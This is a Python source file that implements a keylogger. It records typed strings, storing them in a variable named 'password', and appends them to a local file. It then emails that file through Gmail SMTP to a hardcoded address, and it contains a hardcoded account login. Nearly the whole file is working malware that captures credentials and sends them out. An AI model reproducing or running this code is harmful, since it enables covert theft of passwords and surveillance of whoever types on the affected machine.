import os
import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Part 1: Keylogger
path = "keysniffer_data.txt"

try:
    while True:
        with open(path, "a") as data_file:
            events = keyboard.record("enter")
            password = list(keyboard.get_typed_strings(events))
            data_file.write("\n")
            if password:
                data_file.write(password[0])
except KeyboardInterrupt:
    print("Keylogger stopped.")

# Ensure the file exists and is readable
if not os.path.exists(path):
    print(f"Error: File {path} not found.")
    exit()

# Part 2: Email Sending
fromaddr = "7unkym0nk3y@gmail.com"  # Replace with your Gmail address
toaddr = "7unkym0nk3y@gmail.com"  # Replace with the recipient's email

# Email setup
msg = MIMEMultipart()
msg["From"] = fromaddr
msg["To"] = toaddr
msg["Subject"] = "Keylogger Data"
body = "Attached is the captured keylogger data."
msg.attach(MIMEText(body, "plain"))

# Attach file
filename = os.path.basename(path)
try:
    with open(path, "rb") as attachment:
        p = MIMEBase("application", "octet-stream")
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header("Content-Disposition", f"attachment; filename={filename}")
        msg.attach(p)
except FileNotFoundError:
    print(f"Error: {filename} not found.")
    exit()

# Send email
try:
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.set_debuglevel(1)  # Enable SMTP debugging for detailed logs
    s.login(fromaddr, "test..123")  # Replace with your App Password
    s.sendmail(fromaddr, toaddr, msg.as_string())
    print("Email sent successfully.")
except smtplib.SMTPAuthenticationError:
    print("Authentication failed. Check your email and App Password.")
except Exception as e:
    print(f"Error sending email: {e}")
finally:
    s.quit()
